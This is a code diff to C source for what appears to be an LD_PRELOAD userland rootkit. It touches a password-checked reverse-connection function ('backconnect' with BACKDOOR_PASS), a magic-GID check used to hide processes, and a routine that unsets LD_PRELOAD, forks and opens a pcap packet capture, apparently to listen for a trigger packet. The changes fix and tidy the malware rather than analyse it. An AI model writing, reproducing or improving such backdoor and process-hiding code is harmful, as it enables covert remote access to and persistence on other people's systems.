@@ -36,6 +36,8 @@ void backconnect(struct in_addr addr, u_short port){
     call(CREAD, s, tmp, sizeof(tmp)-1);
     tmp[strlen(tmp)-1]='\0';
     got_pw = !strcmp(crypt(tmp, BACKDOOR_PASS), BACKDOOR_PASS);
+    memset(tmp, 0, sizeof(tmp));
+
     if(!got_pw){
         shutdown(s, SHUT_RDWR);
         close(s);
@@ -89,9 +91,9 @@ int pdoorup(void){
     struct dirent *dir;
     DIR *dp;
     struct stat procstat;
-    gid_t magicgid = readgid();
+    gid_t magicgid = readgid()-1;
 
-    if(getgid() == magicgid-1)
+    if(getgid() == magicgid)
         return 1;
 
     hook(COPENDIR, CREADDIR, C__XSTAT);
@@ -110,7 +112,7 @@ int pdoorup(void){
         if((long)call(C__XSTAT, _STAT_VER, procpath, &procstat) < 0)
             continue;
 
-        if(procstat.st_gid == magicgid-1){
+        if(procstat.st_gid == magicgid){
             status = 1;
             break;
         }
@@ -124,6 +126,7 @@ void spawnpdoor(void){
     if(pdoorup() || getgid() != 0)
         return;
 
+    // if launched at install this will still be set.
     unsetenv("LD_PRELOAD");
 
     pid_t pid = fork();
@@ -163,10 +166,7 @@ void spawnpdoor(void){
 #else
     pcap_if_t *intf;
     int rfind = pcap_findalldevs(&intf, errbuf);
-    if(rfind < 0){
-        //printf("Couldn't find devices: %s\n", errbuf);
-        exit(0);
-    }
+    if(rfind < 0) exit(0);
     dev = intf->name;
 #endif
 
@@ -176,10 +176,6 @@ void spawnpdoor(void){
         net = 0;
         mask = 0;
     }
-
-    /* print capture info */
-    //printf("Device: %s\n", dev);
-    //printf("Filter expression: %s\n", filter_exp);
 
     /* open capture device */
     handle = pcap_open_live(dev, MAX_CAP, 0, 1000, errbuf);
